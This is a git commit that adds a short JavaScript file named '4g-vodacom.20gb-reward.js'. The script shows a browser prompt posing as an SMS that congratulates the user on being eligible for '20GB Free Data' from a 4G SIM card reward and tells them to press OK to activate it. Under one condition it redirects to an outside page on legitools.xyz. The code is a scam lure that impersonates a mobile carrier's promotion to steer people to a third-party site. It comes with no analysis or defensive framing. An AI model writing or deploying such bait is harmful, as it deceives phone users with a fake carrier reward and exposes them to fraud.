38577c8459f3f2ce727de2a2910944a3de377e46
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-11-24 16:07:33 -0800

    Create 4g-vodacom.20gb-reward.js

---
+++ 4g-vodacom.20gb-reward.js
@@ -0,0 +1,5 @@
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data 4G SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://legitools.xyz/4g-vodacom.20gb-reward.html';
+}
